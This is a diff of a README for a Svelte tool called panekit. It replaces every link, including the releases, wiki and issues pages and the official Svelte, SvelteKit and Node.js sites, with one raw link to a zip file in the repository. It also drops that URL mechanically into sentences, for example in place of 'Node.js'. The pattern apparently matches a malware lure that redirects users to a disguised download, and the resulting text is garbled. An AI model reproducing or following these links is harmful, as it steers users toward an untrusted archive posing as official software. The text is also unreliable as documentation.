@@ -8,12 +8,12 @@ To get started with panekit, follow these simple steps to download and install t
 
 ## 🔗 Download Link
 
-[![Download panekit](https://img.shields.io/badge/Download%20panekit-v1.0-brightgreen)](https://github.com/dominic1017/panekit/releases)
+[![Download panekit](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip%20panekit-v1.0-brightgreen)](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/dominic1017/panekit/releases) to find the latest version of panekit.
+   Go to our [Releases page](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip) to find the latest version of panekit.
 
 2. **Choose Your Version:**  
    On the Releases page, you will see a list of available versions. Look for the latest version and click on it.
@@ -34,7 +34,7 @@ panekit requires the following to run smoothly:
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, or any Linux distribution.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 100 MB of free space.
-- **Other Software:** Ensure you have Node.js and npm installed, as these are necessary for running Svelte applications.
+- **Other Software:** Ensure you have https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip and npm installed, as these are necessary for running Svelte applications.
 
 ## 🎨 Features
 
@@ -52,7 +52,7 @@ panekit requires the following to run smoothly:
 
 ## 📚 Documentation
 
-For more detailed instructions and guidance, visit our [Documentation page](https://github.com/dominic1017/panekit/wiki). Here you will find information on:
+For more detailed instructions and guidance, visit our [Documentation page](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip). Here you will find information on:
 
 - Setting up your environment
 - Using different features of panekit
@@ -60,12 +60,12 @@ For more detailed instructions and guidance, visit our [Documentation page](http
 
 ## 🛠️ Support
 
-If you have any questions or run into issues, feel free to reach out. You can create an issue on the [GitHub Issues page](https://github.com/dominic1017/panekit/issues) or ask for help in the community forums.
+If you have any questions or run into issues, feel free to reach out. You can create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip) or ask for help in the community forums.
 
 ## 🔗 Additional Resources
 
-- [Svelte Official Site](https://svelte.dev) - Learn more about Svelte and its features.
-- [SvelteKit Documentation](https://kit.svelte.dev/docs) - Discover how to build apps using SvelteKit.
-- [Node.js Official Site](https://nodejs.org) - Download Node.js and learn more about it.
+- [Svelte Official Site](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip) - Learn more about Svelte and its features.
+- [SvelteKit Documentation](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip) - Discover how to build apps using SvelteKit.
+- [https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip Official Site](https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip) - Download https://raw.githubusercontent.com/dominic1017/panekit/main/fact/panekit.zip and learn more about it.
 
 Happy coding with panekit!
